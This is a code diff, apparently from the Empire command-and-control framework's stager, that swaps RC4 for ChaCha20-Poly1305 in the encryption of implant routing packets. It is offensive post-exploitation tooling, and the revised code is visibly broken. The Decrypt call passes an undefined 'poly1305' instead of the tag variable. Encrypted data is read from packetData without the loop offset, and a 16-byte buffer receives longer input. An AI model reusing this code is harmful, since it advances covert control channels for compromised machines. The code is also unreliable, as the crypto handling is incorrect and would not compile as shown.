@@ -107,15 +107,16 @@ HMACc = first 10 bytes of a SHA256 HMAC using the client's session key
             byte lang = 0x03;
             data = Misc.combine(data, new byte[4] { lang, Convert.ToByte(meta), 0x00, 0x00 });
             data = Misc.combine(data, BitConverter.GetBytes(encryptedBytesLength));
-            byte[] routingPacketData = EmpireStager.rc4Encrypt(rc4Key, data); //TODO
             byte[] chacha_data = new byte[16];
             byte[] poly1305_tag = new byte[16];
+            byte[] chacha_nonce = NewInitializationVector(nonce_length);
             using (var chacha = new ChaCha20Poly1305(sessionInfo.GetStagingKeyBytes()))
             {
                 chacha.Encrypt(chacha_nonce, data, chacha_data, poly1305_tag, associatedData: null);
             }
 
-            byte[] routingPacketData = Misc.combine(initializationVector, routingPacketData, poly1305_tag); //TODO
+            byte[] routingPacketData = Misc.combine(chacha_nonce, chacha_data);
+            routingPacketData = Misc.combine(routingPacketData, poly1305_tag);
             if (encryptedBytes != null && encryptedBytes.Length > 0)
             {
                 routingPacketData = Misc.combine(routingPacketData, encryptedBytes);
@@ -138,18 +139,18 @@ HMACc = first 10 bytes of a SHA256 HMAC using the client's session key
             while (offset < packetData.Length)
             {
                 byte[] routingPacket = packetData.Skip(offset).Take(chacha_header_length).ToArray();
-                byte[] routingInitializationVector = routingPacket.Take(nonce_length).ToArray();
-                byte[] routingEncryptedData = packetData.Skip(nonce_length).Take(32).ToArray();
+                byte[] chachaNonce = routingPacket.Take(nonce_length).ToArray();
+                byte[] routingChachaData = packetData.Skip(nonce_length).Take(32).ToArray(); // chacha20 encrypted data and poly1305 tag
                 offset += chacha_header_length;
 
-                byte[] actual_data = routingPacket.Take(16).ToArray();
-                byte[] tag = routingPacket.Skip(16).Take(16).ToArray();
+                byte[] chachaData = routingChachaData.Take(16).ToArray();
+                byte[] poly1305Tag = routingChachaData.Skip(16).Take(16).ToArray();
 
                 byte[] routingData = new byte[16];
                 // Strip tag + decrypt
                 using (var chacha = new ChaCha20Poly1305(sessionInfo.GetStagingKeyBytes()))
                 {
-                    chacha.Decrypt(routingInitializationVector, actual_data, tag, routingData, associatedData: null);
+                    chacha.Decrypt(chachaNonce, chachaData, poly1305, routingData, associatedData: null);
                 }
                 string packetSessionId = Encoding.UTF8.GetString(routingData.Take(8).ToArray());
                 try
